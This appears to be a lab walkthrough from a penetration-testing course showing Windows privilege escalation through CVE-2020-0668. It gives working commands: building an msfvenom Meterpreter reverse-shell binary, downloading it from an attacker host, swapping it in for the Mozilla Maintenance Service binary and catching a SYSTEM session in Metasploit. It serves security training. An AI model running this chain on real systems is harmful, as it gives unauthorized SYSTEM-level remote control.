# CVE-2020-0668

{% hint style="info" %}
#### Proof of Concept

[https://github.com/RedCursorSecurityConsulting/CVE-2020-0668](https://github.com/RedCursorSecurityConsulting/CVE-2020-0668)
{% endhint %}

To exploit [Microsoft CVE-2020-0668: Windows Kernel Elevation of Privilege Vulnerability](https://itm4n.github.io/cve-2020-0668-windows-service-tracing-eop/), we will exploit an arbitrary file move vulnerability leveraging the Windows Service Tracing. Service Tracing allows users to troubleshoot issues with running services and modules by generating debug information. Its parameters are configurable using the Windows registry.

Setting a custom MaxFileSize value that is smaller than the size of the file prompts the file to be renamed with a `.OLD` extension when the service is triggered. This move operation is performed by `NT AUTHORITY\SYSTEM`, and can be abused to move a file of our choosing with the help of mount points and symbolic links.

## **Checking Current User Privileges**

Let's verify our current user's privileges.

```bash
C:\> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          State
============================= ==================================== ========
SeShutdownPrivilege           Shut down the system                 Disabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
SeUndockPrivilege             Remove computer from docking station Disabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
SeTimeZonePrivilege           Change the time zone                 Disabled
```

## **After Building Solution**

We can use [this](https://github.com/RedCursorSecurityConsulting/CVE-2020-0668) exploit for CVE-2020-0668, download it, and open it in Visual Studio within a VM. Building the solution should create the following files.

```shell-session
CVE-2020-0668.exe
CVE-2020-0668.exe.config
CVE-2020-0668.pdb
NtApiDotNet.dll
NtApiDotNet.xml
```

At this point, we can use the exploit to create a file of our choosing in a protected folder such as `C:\Windows\System32`. We aren't able to overwrite any protected Windows files. This privileged file write needs to be chained with another vulnerability, such as [UsoDllLoader](https://github.com/itm4n/UsoDllLoader) or [DiagHub](https://github.com/xct/diaghub) to load the DLL and escalate our privileges. However, the [UsoDllLoader](https://github.com/itm4n/UsoDllLoader) technique may not work if Windows Updates are pending or currently being installed, and the [DiagHub](https://github.com/xct/diaghub) service may not be available.

We can also look for any third-party software, which can be leveraged, such as the Mozilla Maintenance Service. This service runs in the context of SYSTEM and can be started by unprivileged users. The (non-system protected) binary for this service is located below.

`C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe`

## **Checking Permissions on Binary**

`icacls` confirms that we only have read and execute permissions on this binary based on the line `BUILTIN\Users:(I)(RX)` in the command output.

```bash
C:\> icacls "c:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"

C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe NT AUTHORITY\SYSTEM:(I)(F)
                                                                          BUILTIN\Administrators:(I)(F)
                                                                          BUILTIN\Users:(I)(RX)
                                                                          APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
                                                                          APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)
 
Successfully processed 1 files; Failed processing 0 files
```

## **Generating Malicious Binary**

Let's generate a malicious `maintenanceservice.exe` binary that can be used to obtain a Meterpreter reverse shell connection from our target.

{% code overflow="wrap" %}
```bash
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.14.3 LPORT=8443 -f exe > maintenanceservice.exe
```
{% endcode %}

## **Hosting the Malicious Binary**

We can download it to the target using cURL after starting a Python HTTP server on our attack host like in the `User Account Control` section previously. We can also use wget from the target.

```bash
python3 -m http.server 8080
```

## **Downloading the Malicious Binary**

For this step we need to make two copies of the malicious .exe file. We can just pull it over twice or do it once and make a second copy.

We need to do this because running the exploit corrupts the malicious version of `maintenanceservice.exe` that is moved to (our copy in `c:\Users\htb-student\Desktop` that we are targeting) `c:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe` which we will need to account for later. If we attempt to utilise the copied version, we will receive a `system error 216` because the .exe file is no longer a valid binary.

```powershell
PS C:\> wget http://10.10.15.244:8080/maintenanceservice.exe -O maintenanceservice.exe
PS C:\> wget http://10.10.15.244:8080/maintenanceservice.exe -O maintenanceservice2.exe
```

## **Running the Exploit**

Next, let's run the exploit. It accepts two arguments, the source and destination files.

```bash
C:\> C:\Tools\CVE-2020-0668\CVE-2020-0668.exe C:\Users\htb-student\Desktop\maintenanceservice.exe "C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"                                       

[+] Moving C:\Users\htb-student\Desktop\maintenanceservice.exe to C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe

[+] Mounting \RPC Control onto C:\Users\htb-student\AppData\Local\Temp\nzrghuxz.leo
[+] Creating symbol links
[+] Updating the HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Tracing\RASPLAP configuration.
[+] Sleeping for 5 seconds so the changes take effect
[+] Writing phonebook file to C:\Users\htb-student\AppData\Local\Temp\179739c5-5060-4088-a3e7-57c7e83a0828.pbk
[+] Cleaning up
[+] Done!
```

## **Checking Permissions of New File**

The exploit runs and executing `icacls` again shows the following entry for our user: `WINLPE-WS02\htb-student:(F)`. This means that our `htb-student` user has full control over the maintenanceservice.exe binary, and we can overwrite it with a non-corrupted version of our malicious binary.

```bash
C:\> icacls 'C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe'

C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe NT AUTHORITY\SYSTEM:(F)
                                                                          BUILTIN\Administrators:(F)
                                                                          WINLPE-WS02\htb-student:(F)
```

## **Replacing File with Malicious Binary**

We can overwrite the `maintenanceservice.exe` binary in `c:\Program Files (x86)\Mozilla Maintenance Service` with a good working copy of our malicious binary created earlier before proceeding to start the service. In this example, we downloaded two copies of the malicious binary to `C:\Users\htb-student\Desktop`, `maintenanceservice.exe` and `maintenanceservice2.exe`.

Let's move the good copy that was not corrupted by the exploit `maintenanceservice2.exe` to the Program Files directory, making sure to rename the file properly and remove the `2` or the service won't start. The `copy` command will only work from a cmd.exe window, not a PowerShell console.

```bash
C:\> copy /Y C:\Users\htb-student\Desktop\maintenanceservice2.exe "c:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"

        1 file(s) copied.
```

## **Metasploit Resource Script**

Next, save the below commands to a [Resource Script](https://docs.rapid7.com/metasploit/resource-scripts/) file named `handler.rc`.

```shell-session
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_https
set LHOST <our_ip>
set LPORT 8443
exploit
```

## **Launching Metasploit with Resource Script**

Launch Metasploit using the Resource Script file to preload our settings.

```bash
sudo msfconsole -r handler.rc 
```

```bash
<SNIP>
[*] Processing handler.rc for ERB directives.
resource (handler.rc)> use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
resource (handler.rc)> set PAYLOAD windows/x64/meterpreter/reverse_https
PAYLOAD => windows/x64/meterpreter/reverse_https
resource (handler.rc)> set LHOST 10.10.14.3
LHOST => 10.10.14.3
resource (handler.rc)> set LPORT 8443
LPORT => 8443
resource (handler.rc)> exploit
[*] Started HTTPS reverse handler on https://10.10.14.3:8443
```

## **Starting the Service**

Start the service, and we should get a session as `NT AUTHORITY\SYSTEM`.

```bash
C:\> net start MozillaMaintenance 

The service is not responding to the control function

More help is available by typing NET HELPMSG 2186
```

## **Receiving a Meterpreter Session**

We will get an error trying to start the service but will still receive a callback once the Meterpreter binary executes.

```bash
[*] Started HTTPS reverse handler on https://10.10.14.3:8443
[*] https://10.10.14.3:8443 handling request from 10.129.43.13; (UUID: syyuxztc) Staging x64 payload (201308 bytes) ...
